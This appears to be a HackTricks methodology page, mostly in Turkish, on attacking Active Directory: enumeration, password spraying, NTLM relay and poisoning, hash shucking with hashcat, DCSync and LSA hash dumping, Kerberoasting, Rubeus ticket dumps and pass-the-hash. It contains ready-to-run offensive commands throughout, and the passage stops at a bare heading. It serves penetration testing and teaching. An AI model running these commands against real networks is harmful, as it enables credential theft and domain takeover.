# Active Directory Methodology

{{#include ../../banners/hacktricks-training.md}}

## Temel genel bakış

**Active Directory**, **network administrators**'ın ağ içinde **domains**, **users** ve diğer **objects** oluşturup yönetmesini sağlayan temel bir teknolojidir. Ölçeklenebilir şekilde tasarlanmıştır; çok sayıda kullanıcıyı yönetilebilir **groups** ve **subgroups** halinde organize etmeye ve farklı seviyelerde **access rights** kontrolü sağlamaya imkan verir.

**Active Directory** yapısı üç ana katmandan oluşur: **domains**, **trees** ve **forests**. Bir **domain**, ortak bir veritabanını paylaşan **users** veya **devices** gibi nesneler koleksiyonunu kapsar. **Trees**, ortak bir yapı ile bağlı domain gruplarıdır ve **forest** birden fazla tree'nin **trust relationships** ile birbirine bağlandığı en üst organizasyon katmanıdır. Her bir seviyede belirli **access** ve **communication rights** atanabilir.

Active Directory içindeki ana kavramlar şunlardır:

1. **Directory** – Active Directory nesneleri ile ilgili tüm bilgilerin saklandığı yer.
2. **Object** – Directory içindeki varlıkları, ör. **users**, **groups** veya **shared folders** belirtir.
3. **Domain** – Directory nesneleri için bir konteyner olup, bir **forest** içinde birden fazla domain bulunabilir; her domain kendi nesne koleksiyonunu tutar.
4. **Tree** – Ortak bir root domain'i paylaşan domain gruplaması.
5. **Forest** – Active Directory'deki organizasyon yapısının en üstü; aralarında **trust relationships** olan birden fazla tree'den oluşur.

**Active Directory Domain Services (AD DS)**, ağ içinde merkezi yönetim ve iletişim için kritik bir dizi hizmeti kapsar. Bu servisler şunlardır:

1. **Domain Services** – Veriyi merkezileştirir ve **users** ile **domains** arasındaki etkileşimleri, **authentication** ve **search** fonksiyonları da dahil olmak üzere yönetir.
2. **Certificate Services** – Güvenli **digital certificates** oluşturma, dağıtma ve yönetmeyi denetler.
3. **Lightweight Directory Services** – **LDAP protocol** aracılığıyla directory etkin uygulamaları destekler.
4. **Directory Federation Services** – Birden fazla web uygulamasında tek oturumla kimlik doğrulama sağlayan **single-sign-on** yetenekleri sunar.
5. **Rights Management** – Telif hakkı materyallerinin yetkisiz dağıtımını ve kullanımını sınırlayarak korumaya yardımcı olur.
6. **DNS Service** – **domain names** çözümlemesi için kritik bir servistir.

Daha ayrıntılı açıklama için bakınız: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

Bir AD'ye nasıl **attack** edileceğini öğrenmek istiyorsanız, **Kerberos authentication process**'i gerçekten iyi anlamanız gerekir.\
[**Read this page if you still don't know how it works.**](kerberos-authentication.md)

## Hızlı Başvuru

Hangi komutları kullanarak bir AD'yi enumerate/exploit edebileceğinizi hızlıca görmek için şu kaynağa bakabilirsiniz: [https://wadcoms.github.io/](https://wadcoms.github.io).

> [!WARNING]
> Kerberos communication **requires a full qualifid name (FQDN)** for performing actions. If you try to access a machine by the IP address, **it'll use NTLM and not kerberos**.

## Recon Active Directory (No creds/sessions)

Eğer bir AD ortamına erişiminiz var ama hiçbir kimlik bilgisi/oturumunuz yoksa şunları yapabilirsiniz:

- **Pentest the network:**
- Ağı tara, makineleri ve açık portları bul ve bunlarda **exploit vulnerabilities** veya **extract credentials** elde etmeye çalış (örneğin, [printers could be very interesting targets](ad-information-in-printers.md)).
- DNS'yi enumerate etmek, web, printers, shares, vpn, media vb. gibi domain içindeki ana sunucular hakkında bilgi verebilir.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Bunun nasıl yapılacağı hakkında daha fazla bilgi için Genel [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) sayfasına bakın.
- **Check for null and Guest access on smb services** (bu modern Windows sürümlerinde çalışmayabilir):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- Bir SMB sunucusunu enumerate etme rehberi için ayrıntılı kılavuza bakın:

{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- LDAP'yi enumerate etme hakkında daha ayrıntılı rehber için (anonymous access'e özellikle dikkat edin):

{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
- Responder ile **impersonating services** yaparak kimlik bilgileri toplayın: [**impersonating services with Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- [**abusing the relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) ile hostlara erişim sağlayın
- Evil-S ile **fake UPnP services** açarak kimlik bilgileri toplayın: [**exposing fake UPnP services with evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Domain içi ve genel olarak herkese açık dokümanlar, sosyal medya, servisler (özellikle web) içinden kullanıcı adları/isimleri çıkarın.
- Eğer şirket çalışanlarının tam isimlerini bulursanız, farklı AD **username conventions** denemeyi düşünebilirsiniz ([**read this**](https://activedirectorypro.com/active-directory-user-naming-convention/)). En yaygın konvansiyonlar: _NameSurname_, _Name.Surname_, _NamSur_ (her birinden 3 harf), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _random letters and 3 random numbers_ (abc123).
- Araçlar:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### User enumeration

- **Anonymous SMB/LDAP enum:** [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) ve [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md) sayfalarına bakın.
- **Kerbrute enum**: Geçersiz bir username istendiğinde sunucu **Kerberos error** kodu _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_ ile yanıt verir; bu şekilde username'in geçersiz olduğunu belirleyebiliriz. **Valid usernames** ya AS-REP içinde bir **TGT** ile ya da kullanıcının pre-authentication yapması gerektiğini belirten _KRB5KDC_ERR_PREAUTH_REQUIRED_ hatası ile sonuçlanır.
- **No Authentication against MS-NRPC**: Domain controller'larda MS-NRPC (Netlogon) arayüzüne auth-level = 1 (No authentication) ile bağlanarak kimlik doğrulaması olmadan MS-NRPC arayüzünü çağırmak. Metot, MS-NRPC arayüzüne bind edildikten sonra `DsrGetDcNameEx2` fonksiyonunu çağırır ve kullanıcı veya bilgisayarın var olup olmadığını herhangi bir credential olmadan kontrol eder. Bu tip enumeration'ı uygulayan araç [NauthNRPC](https://github.com/sud0Ru/NauthNRPC)'dur. Araştırma şu adreste bulunabilir: https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

Eğer ağda bu sunuculardan birini bulursanız, bunun üzerinde **user enumeration** da gerçekleştirebilirsiniz. Örneğin, [**MailSniper**](https://github.com/dafthack/MailSniper) aracını kullanabilirsiniz:
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> Kullanıcı adı listelerini [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)  ve bu repoda ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)) bulabilirsiniz.
>
> Ancak, bunu yapmadan önce gerçekleştirmiş olmanız gereken recon adımından şirket çalışanlarının **isimlerini** edinmiş olmalısınız. İsim ve soyisim ile potansiyel geçerli kullanıcı adları oluşturmak için [**namemash.py**](https://gist.github.com/superkojiman/11076951) script'ini kullanabilirsiniz.

### Bir veya birkaç kullanıcı adını bilmek

Tamam, yani geçerli bir kullanıcı adınız var ama şifre yok... O zaman deneyin:

- [**ASREPRoast**](asreproast.md): Eğer bir kullanıcının _DONT_REQ_PREAUTH_ özniteliği **yoksa**, o kullanıcı için **AS_REP message** talep edebilirsiniz; bu mesaj, kullanıcının şifresinden türetilmiş bir anahtarla şifrelenmiş bazı veriler içerir.
- [**Password Spraying**](password-spraying.md): Keşfedilen her kullanıcı için en **common passwords**'u deneyin; belki bazı kullanıcılar zayıf bir parola kullanıyordur (parola politikasını unutmayın!).
- Ayrıca kullanıcıların posta sunucularına erişim elde etmeyi denemek için **spray OWA servers** yapabileceğinizi unutmayın.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Ağdaki bazı protokolleri poisoning yaparak kırmak için bazı challenge hash'ler elde edebilirsiniz:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Eğer Active Directory'yi enumerate etmeyi başardıysanız, **daha fazla e-postaya ve ağ hakkında daha iyi bir anlayışa** sahip olursunuz. NTLM aracılığıyla AD ortamına erişmek için NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) zorlayabilirsiniz.

### NetExec workspace-driven recon & relay posture checks

- Her engagement için AD recon durumunu saklamak üzere **`nxcdb` workspaces** kullanın: `workspace create <name>` komutu `~/.nxc/workspaces/<name>` altında protokole göre ayrılmış SQLite DB'leri (smb/mssql/winrm/ldap/etc) oluşturur. Görünümler arası geçiş için `proto smb|mssql|winrm` kullanın ve toplanan secret'ları `creds` ile listeleyin. İş bitince hassas verileri elle temizleyin: `rm -rf ~/.nxc/workspaces/<name>`.
- Hızlı alt ağ keşfi için **`netexec smb <cidr>`** kullanımı **domain**, **OS build**, **SMB signing requirements** ve **Null Auth** bilgilerini ortaya çıkarır. `(signing:False)` gösteren üyeler **relay-prone** iken, DC'ler genellikle signing gerektirir.
- NetExec çıktısından doğrudan **hostnames in /etc/hosts** oluşturarak hedeflemeyi kolaylaştırın:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- **SMB relay to the DC is blocked** by signing durumunda, yine de **LDAP** duruşunu test edin: `netexec ldap <dc>` `(signing:None)` / weak channel binding'i gösterir. SMB signing required ancak LDAP signing disabled olan bir DC, **relay-to-LDAP** hedefi olarak SPN-less RBCD gibi kötüye kullanımlar için hâlâ uygundur.

### İstemci tarafı yazıcı credential leaks → toplu domain credential doğrulaması

- Yazıcı/web UIs bazen **HTML içinde maskelenmiş admin parolalarını gömer**. Kaynağı görüntülemek/devtools açık metni ortaya çıkarabilir (ör. `<input value="<password>">`), bu da Basic-auth ile scan/print repository'lerine erişim sağlar.
- Elde edilen yazdırma işleri kullanıcı başına parolalar içeren **düz metin onboarding dokümanları** içerebilir. Test yaparken eşleştirmelerin uyumlu kalmasına dikkat edin:
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### Steal NTLM Creds

Eğer **null or guest user** ile diğer PC'lere veya paylaşımlara erişebiliyorsanız, erişildiğinde size karşı bir NTLM kimlik doğrulaması tetikleyecek (ör. bir SCF file) **dosyalar yerleştirebilir** ve böylece kırmak için **NTLM challenge**'ını çalabilirsiniz:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** elinizdeki her NT hash'ini, anahtar materyali doğrudan NT hash'inden türetilen daha yavaş formatlarda candidate password olarak değerlendirir. Kerberos RC4 ticket'ları, NetNTLM challenge'ları veya cached credentials içindeki uzun parola ifadelerini brute-forcelamak yerine, NT hash'lerini Hashcat’in NT-candidate modlarına verirsiniz ve düz metni öğrenmeden parola yeniden kullanımını doğrulatırsınız. Bu, bir domain kompromisi sonrası binlerce güncel ve geçmiş NT hash'i hasat edebileceğiniz durumlarda özellikle etkilidir.

Use shucking when:

- DCSync, SAM/SECURITY dumps veya credential vaults'tan bir NT corpus sahibisiniz ve bunu diğer domains/forests içinde yeniden kullanım için test etmeniz gerekiyor.
- RC4-tabanlı Kerberos materyali (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM responses veya DCC/DCC2 blob'ları yakaladığınızda.
- Uzun, kırılması zor passphrase'lerin yeniden kullanıldığını hızlıca kanıtlayıp hemen Pass-the-Hash ile pivot etmek istiyorsanız.

The technique **does not work** against encryption types whose keys are not the NT hash (e.g., Kerberos etype 17/18 AES). If a domain enforces AES-only, you must revert to the regular password modes.

#### NT hash korpusu oluşturma

- **DCSync/NTDS** – `secretsdump.py`'yi history ile kullanarak mümkün olan en geniş NT hash setini (ve önceki değerlerini) alın:

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

History girdileri aday havuzunu dramatik şekilde genişletir çünkü Microsoft bir hesap için 24'e kadar önceki hash saklayabilir. NTDS secrets toplamanın diğer yolları için bakınız:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (veya Mimikatz `lsadump::sam /patch`) yerel SAM/SECURITY verilerini ve cached domain logon'ları (DCC/DCC2) çıkarır. Bu hash'leri çoğaltılmamış halde aynı `nt_candidates.txt` listesine ekleyin.
- **Track metadata** – Her hash'i üreten username/domain bilgisini saklayın (wordlist sadece hex içerse bile). Hash eşleşmeleri, Hashcat kazanan adayı yazdırdığında hangi principal'ın parolayı yeniden kullandığını hemen söyler.
- Aynı forest'ten veya trusted forest'ten gelen adayları tercih edin; bu, shucking sırasında örtüşme şansını maksimize eder.

#### Hashcat NT-candidate modları

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Notlar:

- NT-candidate girdileri **ham 32-hex NT hash'leri** olarak kalmalıdır. Rule engine'leri devre dışı bırakın (no `-r`, no hybrid modes) çünkü mangling candidate anahtar materyalini bozacaktır.
- Bu modlar doğası gereği daha hızlı değildir, ancak NTLM keyspace'i (~30,000 MH/s on an M3 Max) Kerberos RC4'e (~300 MH/s) göre ~100× daha hızlıdır. Küratörlü bir NT listesini test etmek, yavaş formatta tüm parola uzayını keşfetmekten çok daha ucuzdur.
- Her zaman **en son Hashcat build**'ini (`git clone https://github.com/hashcat/hashcat && make install`) çalıştırın çünkü 31500/31600/35300/35400 modları yakın zamanda eklendi.
- Şu an AS-REQ Pre-Auth için bir NT modu yoktur ve AES etype'ları (19600/19700) için anahtarlar raw NT hash'lerinden değil, UTF-16LE parolalardan PBKDF2 ile türetildiği için düz metin parola gerekir.

#### Örnek – Kerberoast RC4 (mode 35300)

1. Hedef bir SPN için düşük ayrıcalıklı bir kullanıcı ile bir RC4 TGS yakalayın (ayrıntılar için Kerberoast sayfasına bakın):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Bileti NT listenizle shuck edin:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat her NT adayından RC4 anahtarını türetir ve `$krb5tgs$23$...` blob'unu doğrular. Bir eşleşme servis hesabının mevcut NT hash'lerinizden birini kullandığını teyit eder.

3. Hemen PtH ile pivot yapın:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

Gerekirse daha sonra düz metni kurtarmak için `hashcat -m 1000 <matched_hash> wordlists/` komutunu kullanabilirsiniz.

#### Örnek – Cached credentials (mode 31600)

1. Kompromize olmuş bir workstation'dan cached logon'ları dump edin:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. İlginizi çeken domain kullanıcı için DCC2 satırını `dcc2_highpriv.txt`'e kopyalayın ve shuck edin:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. Başarılı bir eşleşme, listenizde zaten bilinen NT hash'ini verir ve cached kullanıcının bir parolayı yeniden kullandığını kanıtlar. Bunu doğrudan PtH için kullanın (`nxc smb <dc_ip> -u highpriv -H <hash>`) veya string'i kurtarmak için hızlı NTLM modunda brute-force uygulayın.

Aynı iş akışı NetNTLM challenge-response'ları (`-m 27000/27100`) ve DCC (`-m 31500`) için de geçerlidir. Bir eşleşme belirlendikten sonra relay, SMB/WMI/WinRM PtH başlatabilir veya NT hash'i offline olarak masks/rules ile yeniden kırabilirsiniz.



## Kimlik bilgileri/oturum ile Active Directory'yi enumerate etme

Bu aşama için geçerli bir domain hesabının kimlik bilgilerini veya oturumunu **kompromize etmiş** olmanız gerekir. Eğer elinizde bazı geçerli kimlik bilgileri veya domain kullanıcısı olarak bir shell varsa, **önceden verilen seçeneklerin diğer kullanıcıları kompromize etmek için hâlâ seçenekler olduğunu** unutmayın.

Authenticated enumeration'a başlamadan önce **Kerberos double hop problem**'ı bilmelisiniz.


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumerasyon

Bir hesabı kompromize etmek, tüm domain'i kompromize etmeye başlamak için **büyük bir adımdır**, çünkü **Active Directory enumerasyonu** yapmaya başlayabilirsiniz:

[**ASREPRoast**](asreproast.md) ile şimdi bütün potansiyel zafiyetli kullanıcıları bulabilirsiniz, ve [**Password Spraying**](password-spraying.md) ile tüm kullanıcı adlarının bir **listesini** elde edip kompromize hesap parolasını, boş parolaları ve yeni umut vaat eden parolaları deneyebilirsiniz.

- [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info) kullanabilirsiniz.
- Ayrıca [**powershell for recon**](../basic-powershell-for-pentesters/index.html) kullanabilirsiniz; bu daha gizli olacaktır.
- Daha detaylı bilgi çıkarmak için [**use powerview**](../basic-powershell-for-pentesters/powerview.md) kullanabilirsiniz.
- Active Directory'de recon için başka müthiş bir araç [**BloodHound**](bloodhound.md). Kullanım yöntemlerinize bağlı olarak **çok gizli değildir**, ama **bunu umursamıyorsanız** kesinlikle denemelisiniz. Kullanıcıların nerelere RDP yapabildiğini, diğer gruplara giden yolları vb. bulun.
- **Diğer otomatik AD enumeration araçları:** [**AD Explorer**](bloodhound.md#ad-explorer), [**ADRecon**](bloodhound.md#adrecon), [**Group3r**](bloodhound.md#group3r), [**PingCastle**](bloodhound.md#pingcastle).
- [**DNS records of the AD**](ad-dns-records.md) çünkü ilginç bilgiler içerebilir.
- Directory'yi enumerate etmek için kullanabileceğiniz GUI'li bir araç, **SysInternal** Suite'ten **AdExplorer.exe**'dir.
- Ayrıca LDAP veritabanında **ldapsearch** ile _userPassword_ & _unixUserPassword_ alanlarında veya hatta _Description_ içinde credential arayabilirsiniz. Diğer yöntemler için bkz. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment).
- Eğer **Linux** kullanıyorsanız, domain'i enumerate etmek için [**pywerview**](https://github.com/the-useless-one/pywerview) kullanabilirsiniz.
- Ayrıca şu otomatik araçları deneyebilirsiniz:
  - [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
  - [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Tüm domain kullanıcılarını çıkarmak**

Windows'ta tüm domain kullanıcı adlarını elde etmek çok kolaydır (`net user /domain`, `Get-DomainUser` veya `wmic useraccount get name,sid`). Linux'ta ise `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` veya `enum4linux -a -u "user" -p "password" <DC IP>` kullanabilirsiniz.

> Bu Enumeration bölümü küçük görünse bile, tümünün en önemli kısmıdır. Linklere (özellikle cmd, powershell, powerview ve BloodHound olanlara) erişin, bir domain'i nasıl enumerate edeceğinizi öğrenin ve rahat hissedene kadar pratik yapın. Bir assessment sırasında, bu DA'ya ulaşmak veya hiçbir şey yapılamayacağına karar vermek için kilit an olacaktır.

### Kerberoast

Kerberoasting, kullanıcı hesaplarına bağlı hizmetler tarafından kullanılan **TGS ticket**'larını elde etmeyi ve bu ticket'ların şifrelemesini—ki bu kullanıcı parolalarına dayanır—**offline** kırmayı içerir.

More about this in:


{{#ref}}
kerberoast.md
{{#endref}}

### Uzaktan bağlantı (RDP, SSH, FTP, Win-RM, etc)

Birkaç kimlik bilgisi elde ettikten sonra herhangi bir **machine**'a erişiminiz olup olmadığını kontrol edebilirsiniz. Bu amaçla port taramalarınıza göre farklı protokollerle birden fazla sunucuya bağlanmayı denemek için **CrackMapExec** kullanabilirsiniz.

### Local Privilege Escalation

Eğer rutin bir domain kullanıcısı olarak kimlik bilgilerini veya bir oturumu kompromize ettiyseniz ve bu kullanıcı ile domain'deki herhangi bir makinaya **erişiminiz** varsa, yerel olarak ayrıcalıkları yükseltmenin ve credential'ları yağmalamanın yollarını aramalısınız. Çünkü yalnızca local administrator ayrıcalıklarıyla diğer kullanıcıların hash'lerini bellekten (LSASS) ve yerelde (SAM) dump edebilirsiniz.

Bu kitapta [**local privilege escalation in Windows**](../windows-local-privilege-escalation/index.html) hakkında tam bir sayfa ve bir [**checklist**](../checklist-windows-privilege-escalation.md) bulunmaktadır. Ayrıca [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) kullanmayı unutmayın.

### Geçerli Oturum Ticket'ları

Geçerli kullanıcının elindeki **ticket'ların** size beklenmedik kaynaklara **erişim izni** verecek şekilde bulunma olasılığı çok **düşüktür**, ancak kontrol edebilirsiniz:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

If you have managed to enumerate the active directory you will have **more emails and a better understanding of the network**. You might be able to to force NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**.**

### Bilgisayar Paylaşımlarında Creds Arama | SMB Shares

Now that you have some basic credentials you should check if you can **find** any **interesting files being shared inside the AD**. You could do that manually but it's a very boring repetitive task (and more if you find hundreds of docs you need to check).

[**Follow this link to learn about tools you could use.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

If you can **access other PCs or shares** you could **place files** (like a SCF file) that if somehow accessed will t**rigger an NTLM authentication against you** so you can **steal** the **NTLM challenge** to crack it:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

This vulnerability allowed any authenticated user to **compromise the domain controller**.


{{#ref}}
printnightmare.md
{{#endref}}

## Active Directory üzerinde Privilege escalation (privileged credentials/session ile)

**For the following techniques a regular domain user is not enough, you need some special privileges/credentials to perform these attacks.**

### Hash extraction

Hopefully you have managed to **compromise some local admin** account using [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) including relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalating privileges locally](../windows-local-privilege-escalation/index.html).\
Then, its time to dump all the hashes in memory and locally.\
[**Read this page about different ways to obtain the hashes.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Once you have the hash of a user**, you can use it to **impersonate** it.\
You need to use some **tool** that will **perform** the **NTLM authentication using** that **hash**, **or** you could create a new **sessionlogon** and **inject** that **hash** inside the **LSASS**, so when any **NTLM authentication is performed**, that **hash will be used.** The last option is what mimikatz does.\
[**Read this page for more information.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

This attack aims to **use the user NTLM hash to request Kerberos tickets**, as an alternative to the common Pass The Hash over NTLM protocol. Therefore, this could be especially **useful in networks where NTLM protocol is disabled** and only **Kerberos is allowed** as authentication protocol.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

In the **Pass The Ticket (PTT)** attack method, attackers **steal a user's authentication ticket** instead of their password or hash values. This stolen ticket is then used to **impersonate the user**, gaining unauthorized access to resources and services within a network.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

If you have the **hash** or **password** of a **local administrator** you should try to **login locally** to other **PCs** with it.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Bunun oldukça **gürültülü** olduğunu ve **LAPS**'ın bunu **hafifletebileceğini** unutmayın.

### MSSQL Kötüye Kullanımı & Trusted Links

Bir kullanıcının **MSSQL instance'larına erişim** yetkisi varsa, MSSQL hostunda (eğer SA olarak çalışıyorsa) **komut çalıştırmak**, NetNTLM **hash**'ini **çalmak** veya hatta bir **relay** **attack** gerçekleştirmek için bunu kullanabilmesi mümkündür.\
Ayrıca, eğer bir MSSQL instance'ı başka bir MSSQL instance'ı tarafından trusted (database link) olarak tanınıyorsa ve kullanıcı trusted database üzerinde yetkilere sahipse, **trust ilişkisini kullanarak diğer instance'ta da sorgu çalıştırabilecektir**. Bu trust'lar zincirlenebilir ve bir noktada kullanıcı komut çalıştırabileceği yanlış yapılandırılmış bir database bulabilir.\
**Veritabanları arasındaki linkler forest trust'ları boyunca bile çalışır.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT varlık/dağıtım platformları kötüye kullanımı

Üçüncü taraf envanter ve dağıtım çözümleri genellikle kimlik bilgilerine ve kod çalıştırmaya güçlü yollar açar. Bakınız:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Eğer herhangi bir Computer objesinde [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) özniteliğini bulursanız ve o bilgisayar üzerinde domain ayrıcalıklarına sahipseniz, bilgisayara oturum açan tüm kullanıcıların belleğinden TGT'leri dump'layabileceksiniz.\
Dolayısıyla, eğer bir **Domain Admin bilgisayara giriş yaparsa**, onun TGT'sini dump'layıp [Pass the Ticket](pass-the-ticket.md) kullanarak onun taklidini yapabileceksiniz.\
Constrained delegation sayesinde bir **Print Server'ı otomatik olarak ele geçirmek** bile mümkün olabilir (umarız DC olmaz).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Eğer bir kullanıcı veya bilgisayar "Constrained Delegation" için izinliyse, o bilgisayar üzerindeki bazı servislere erişmek için **herhangi bir kullanıcıyı taklit edebilecektir**.\
Sonrasında, eğer bu kullanıcı/bilgisayarın **hash'ini ele geçirirseniz**, bazı servislere erişmek için **herhangi bir kullanıcıyı** (domain admin'ler dahil) **taklit edebileceksiniz**.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Uzak bir bilgisayarın Active Directory objesi üzerinde **WRITE** ayrıcalığına sahip olmak, **yüksek ayrıcalıklarla** kod yürütmeyi mümkün kılar:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Kötüye Kullanımı

Ele geçirilen kullanıcı bazı domain objeleri üzerinde **ilginç ayrıcalıklara** sahip olabilir; bu da sonrasında lateral **hareket** etmenize veya **yükseltme** yapmanıza izin verebilir.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler servisinin kötüye kullanımı

